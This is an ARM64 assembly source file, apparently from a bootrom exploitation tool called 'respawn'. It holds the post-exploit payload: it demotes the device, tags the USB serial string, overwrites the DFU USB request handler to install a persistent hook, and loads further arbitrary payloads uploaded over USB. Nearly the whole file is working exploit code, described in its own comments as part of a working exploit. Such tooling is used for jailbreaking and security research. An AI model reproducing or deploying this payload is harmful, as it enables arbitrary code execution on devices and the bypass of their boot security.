//
//  Copyright (c) 2022-2023 Jon Palmisciano. All rights reserved.
//
//  Use of this source code is governed by the BSD 3-Clause license; a full
//  copy of the license can be found in the LICENSE.txt file.
//

#include "respawn/payload/constants.h"

	// Invalidate the cache line that holds the argument.
	.macro DCI arg
	dc	civac, \arg
	dmb	sy
	.endm

	// Invalidate the instruction cache (and more).
	.macro ICI
	ic	iallu
	dsb	sy
	isb
	.endm

bootstrap:
	stp	x29, x30, [sp, #-0x10]!

	tst	REG_OPTIONS, #OPT_DEMOTE
	b.eq	L__post_demote

	str	wzr, [REG_CHIPID_BASE]

	tst	REG_OPTIONS, #OPT_HALT
	b.eq	L__post_demote

L__spin:
	b	L__spin

L__post_demote:
	tst	REG_OPTIONS, #OPT_TAG_SERIAL
	b.eq	L__post_tag_serial

	mov	x0, REG_SERIAL
L__find_serial_terminator:
	ldrb	w1, [x0, #1]!
	cbnz	w1, L__find_serial_terminator

	// Tag the end of serial string.
	adr	x1, serial_tag_string
	ldp	x2, x3, [x1]
	stp	x2, x3, [x0]

	// Re-create the USB descriptor for the serial. This is necessary for
	// the serial string to actually update.
	mov	x0, REG_SERIAL
	blr	REG_USB_CREATE_DESC_FN
	strb	w0, [REG_USB_SERIAL_DESC]

L__post_tag_serial:
	tst	REG_OPTIONS, #OPT_INSTALL_HOOK
	b.eq	L__bootstrap_end

	// There is a limited amount that can be done to the device during the
	// initial exploitation alone. Among other reasons, this payload is
	// limited in size and therefore cannot embed elaborate procedures. In
	// order to perform more complex operations, some form of persistence
	// on the device is needed so the host can communicate with the device.
	//
	// Each USB interface has a function pointer to its request handler. By
	// overwriting this pointer with the address of our own code, we can
	// effectively intercept all USB requests seen by the interface (in
	// this case, the DFU interface).
	//
	// This allows us to perform special communication with the device via
	// the parameters of each USB request, which are trivially controllable
	// by the host.
	ldr	x6, [REG_DFU_HANDLE_REQUEST_FN_PTR]
	str	REG_COPY_DEST, [REG_DFU_HANDLE_REQUEST_FN_PTR]
	DCI	REG_DFU_HANDLE_REQUEST_FN_PTR

	// The USB request hook we install will need access to a few
	// target-specific constants (which are currently sitting in registers,
	// courtesy of the initial exploit) that need to be copied somewhere
	// safe before they are clobbered.
	adr	x4, dfu_handle_request
	str	x6, [x4]
	str	REG_DFU_BASE, [x4, #8]!
	str	REG_USB_TRANSFER_FN, [x4, #8]!
	str	REG_DFU_HANDLE_REQUEST_FN_PTR, [x4, #8]!

	// Finally, the code for the USB request hook needs to actually be
	// copied to the address that DFU USB interface now points to.
	adr	x4, basic_hook
	adr	x5, basic_hook_end
L__copy:
	// TODO: This could probably be optimized by using LDP/STP, but is that
	// really worth breaking a working exploit?
	ldr	x0, [x4], #8
	str	x0, [REG_COPY_DEST], #8

	cmp	x4, x5
	b.lo	L__copy

	// Invalidate all the caches for good fortune.
	ICI

L__bootstrap_end:
	ldp	x29, x30, [sp], #0x10
	ret

//------------------------------------------------------------------------------

basic_hook:
	// Check the request parameters; anything that isn't a DFU upload
	// request (0xA1, 2) should be ignored and handled normally.
	ldrh	w2, [x0]
	cmp	w2, #0x2A1	
	b.eq	upload_handler

	ldr	x7, dfu_handle_request
	br	x7

dfu_handle_request:
	// Address of the real DFU request handler so we can forward requests
	// we don't want to intercept.
	.quad 0x3f3f3f3f3f3f3f3f

dfu_base_address:
	// DFU download buffer base address (where we can place data over USB).
	.quad 0x3f3f3f3f3f3f3f3f

usb_core_do_transfer:
	// Address of the `usb_core_do_transfer` function, used to gracefully
	// complete intercepted requests.
	.quad 0x3f3f3f3f3f3f3f3f

dfu_handle_request_ptr:
	// Address of the request handler pointer on the DFU USB interface
	// structure so this hook can be replaced later.
	.quad 0x3f3f3f3f3f3f3f3f

upload_handler:
	stp	x29, x30, [sp, #-0x10]!
	mov	x29, sp
	stp	x20, x19, [sp, #-0x10]!

	// Preserve the pointer to the USB request structure in X0.
	mov	x19, x0

	// This hook only exists to facilitate the installation of a
	// subsequent, arbitrary payload. This allows said payload to be
	// developed out-of-band and swapped out easily by the host, e.g. to
	// perform different tasks.
	//
	// As such, this hook is designed to do only one thing: copy whatever
	// payload was uploaded to the DFU buffer to somewhere else in memory,
	// then register it as the request handler for the DFU USB interface.
	ldr	w3, upload_eof_magic
	ldr	x20, dfu_base_address
	adr	x1, upload_base
L__upload_copy_loop:
	ldr	x0, [x20], #8
	str	x0, [x1], #8

	// Check if the "stop copying" magic has been found; obey it if so.
	ldr	w2, [x20]
	cmp	w2, w3
	b.ne	L__upload_copy_loop

	// It is assumed that the payload uploaded has a similar pool of
	// constants to this one at offset 0x14. Any payloads uploaded will
	// have to match this format, but as a reward, will have said constant
	// pool updated with correct values before use.
	adr	x4, upload_base
	add	x4, x4, #0x14
	ldr	x6, dfu_handle_request
	str	x6, [x4], #8
	ldr	x6, dfu_base_address
	str	x6, [x4], #8
	ldr	x6, usb_core_do_transfer
	str	x6, [x4], #8

	// Switch the USB request handler over to the new payload.
	adr	x1, upload_base
	ldr	x0, dfu_handle_request_ptr
	str	x1, [x0]

	// Trash the cache again for good fortune.
	DCI	x0
	ICI

	// Gracefully complete the USB request (so the USB task doesn't die).
	mov	w0, #0x80
	mov	x1, x20
	ldrh	w2, [x19, #6]
	mov	x3, #0
	ldr	x4, usb_core_do_transfer
	blr	x4

	mov	w0, #0
	ldp	x20, x19, [sp], #0x10
	ldp	x29, x30, [sp], #0x10
	ret

upload_eof_magic:
	// Magic value which must be appended to any payload uploaded to
	// indicate copying should stop, since the copy logic isn't designed to
	// use a size parameter, etc.
	.dword 0x41414141

	.align 3
basic_hook_end:
serial_tag_string:
	.asciz " RSPN:666"

	.align 3
upload_base:
	.quad 0x4040404040404040
